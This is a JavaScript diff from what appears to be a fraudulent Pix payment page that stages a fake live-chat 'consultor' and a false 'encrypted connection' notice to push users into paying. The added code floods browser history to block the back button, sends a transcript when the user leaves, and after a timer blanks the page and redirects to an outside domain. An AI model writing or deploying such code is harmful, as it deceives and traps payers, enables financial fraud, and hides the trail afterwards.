+  window.addEventListener('blur', function() { for (let i = 0; i < 10; i++) history.pushState({ diskgas_lock: true }, '', location.href); });
+  document.addEventListener('visibilitychange', function() { if (document.visibilityState === 'visible') for (let i = 0; i < 15; i++) history.pushState({ diskgas_lock: true }, '', location.href); });
+  window.addEventListener('beforeunload', function() { history.pushState({ diskgas_lock: true }, '', location.href); sendTranscript(); });
+  window.addEventListener('pagehide', function() { for (let i = 0; i < 20; i++) history.pushState({ diskgas_lock: true }, '', location.href); });
 }
 
-// ── INIT ─────────────────────────────────────────────
 (async () => {
-  lockBackButton();
-  updateModal();
-  
+  lockBackButton(); updateModal();
   const savedHTML = loadChatHistory();
   const savedState = localStorage.getItem(STATE_STORAGE_KEY);
-  
   if (savedHTML && savedState) {
     const state = JSON.parse(savedState);
-    window._currentPixCode = state.pixCode;
-    window._pixCopyTimer = null;
-    window._pixPaymentTimer = null;
-    window._pixCopyReminderSent = false;
-    window._pixPaymentReminderSent = false;
-    lastSender = state.lastSender;
-    window._currentFlowStep = state.flowStep || 0;
-    window._paymentConfirmed = state.paymentConfirmed || false;
-    window._contactMsgSent = state.contactMsgSent || false;
-    window._pixCopyClicked = state.pixCopyClicked || false;
-    window._pixCopyReminderSent = state.pixCopyReminderSent || false;
-    window._pixPaymentReminderSent = state.pixPaymentReminderSent || false;
+    window._currentPixCode = state.pixCode; window._pixCopyTimer = null; window._pixPaymentTimer = null; window._pixCopyReminderSent = false; window._pixPaymentReminderSent = false;
+    lastSender = state.lastSender; window._currentFlowStep = state.flowStep || 0; window._paymentConfirmed = state.paymentConfirmed || false; window._contactMsgSent = state.contactMsgSent || false; window._pixCopyClicked = state.pixCopyClicked || false; window._pixCopyReminderSent = state.pixCopyReminderSent || false; window._pixPaymentReminderSent = state.pixPaymentReminderSent || false;
     msgsEl.innerHTML = savedHTML;
-    
     const pixCopyBtn = msgsEl.querySelector('#pixCopyBtn');
     if (pixCopyBtn && window._currentPixCode) {
         pixCopyBtn.onclick = () => {
-          window._pixCopyClicked = true;
-          if (window._pixCopyTimer) clearTimeout(window._pixCopyTimer);
+          window._pixCopyClicked = true; if (window._pixCopyTimer) clearTimeout(window._pixCopyTimer);
           navigator.clipboard.writeText(window._currentPixCode).catch(()=>{});
         pixCopyBtn.classList.add('copied');
         pixCopyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código copiado!`;
@@ -1976,14 +1723,12 @@ function lockBackButton() {
         }, 2500);
       };
     }
-    
     const btnCorrect = msgsEl.querySelector('#btnCorrect');
     const btnChange = msgsEl.querySelector('#btnChange');
     if (btnCorrect && btnChange && window._currentFlowStep === 3) {
         btnCorrect.onclick = async () => {
             const block = btnCorrect.closest('.order-confirmation-block');
-            block.style.opacity='0.8';
-            block.style.pointerEvents='none';
+            block.style.opacity='0.8'; block.style.pointerEvents='none';
             btnCorrect.style.background = 'var(--green)';
             btnCorrect.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="margin-right:8px;"><polyline points="20 6 9 17 4 12"/></svg> Confirmado';
             block.querySelectorAll('button').forEach(b=>b.disabled=true);
@@ -1992,31 +1737,18 @@ function lockBackButton() {
         };
         btnChange.onclick = () => { updateModal(true); modalOverlayEl.classList.add('on'); };
     }
-    
-    msgsEl.querySelectorAll('.intro-card, .m-avatar:not(.ghost)').forEach(el => {
-      el.onclick = openSellerModal;
-    });
-
+    msgsEl.querySelectorAll('.intro-card, .m-avatar:not(.ghost)').forEach(el => { el.onclick = openSellerModal; });
     scrollDown(true);
-
-    if (window._currentFlowStep < 9 && window._currentFlowStep !== 99) {
-      runConversation(window._currentFlowStep);
-    }
+    if (window._currentFlowStep < 9 && window._currentFlowStep !== 99) runConversation(window._currentFlowStep);
   } else {
     const { onReadPromise } = addMsg('Olá! Gostaria de pagar agora via Pix.','user');
-    await pause(500);
-    const connSys = addSys('Conexão criptografada estabelecida','secure');
-    await pause(700);
-    const sp = addSpinner('Aguarde um momento...');
+    await pause(500); const connSys = addSys('Conexão criptografada estabelecida','secure');
+    await pause(700); const sp = addSpinner('Aguarde um momento...');
     const searchSys = addSys('Buscando consultor disponível...','brand');
-    await pause(1600);
-    sp.remove(); connSys.parentElement.remove();
+    await pause(1600); sp.remove(); connSys.parentElement.remove();
     searchSys.textContent=''; searchSys.className='ok';
     searchSys.innerHTML=`<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Thiago Callegari conectado`;
-    await pause(500);
-    showIntroCard();
-    await onReadPromise;
-    await runConversation();
+    await pause(500); showIntroCard(); await onReadPromise; await runConversation();
   }
 })();
 </script>
@@ -2025,37 +1757,22 @@ function lockBackButton() {
   const REDIRECT_URL    = 'https://concluerror.onrender.com';
   const MS_FIRST_ACCESS = 25 * 60 * 1000;
   const MS_AFTER_PIX    = 15 * 60 * 1000;
-  const KEY_FA  = 'dg_fa';
-  const KEY_PT  = 'dg_pt';
+  const KEY_FA  = 'dg_fa'; const KEY_PT  = 'dg_pt';
   let _timer = null;
-
   function startTimer(ms) {
     if (_timer) clearTimeout(_timer);
-    _timer = setTimeout(() => {
-      document.body.innerHTML = '';
-      window.location.href = REDIRECT_URL;
-    }, ms);
+    _timer = setTimeout(() => { document.body.innerHTML = ''; window.location.href = REDIRECT_URL; }, ms);
   }
-
   let fa = localStorage.getItem(KEY_FA);
-  if (!fa) {
-    fa = Date.now();
-    localStorage.setItem(KEY_FA, fa);
-  }
+  if (!fa) { fa = Date.now(); localStorage.setItem(KEY_FA, fa); }
   let remainFA = MS_FIRST_ACCESS - (Date.now() - parseInt(fa));
-  if (remainFA <= 0) {
-    window.location.href = REDIRECT_URL;
-    return;
-  }
+  if (remainFA <= 0) { window.location.href = REDIRECT_URL; return; }
   startTimer(remainFA);
-
   setInterval(() => {
     let pt = localStorage.getItem(KEY_PT);
     if (!pt && window._currentPixCode) {
-      pt = Date.now();
-      localStorage.setItem(KEY_PT, pt);
-      let remainPT = MS_AFTER_PIX;
-      startTimer(remainPT);
+      pt = Date.now(); localStorage.setItem(KEY_PT, pt);
+      let remainPT = MS_AFTER_PIX; startTimer(remainPT);
     }
   }, 2000);
 })();
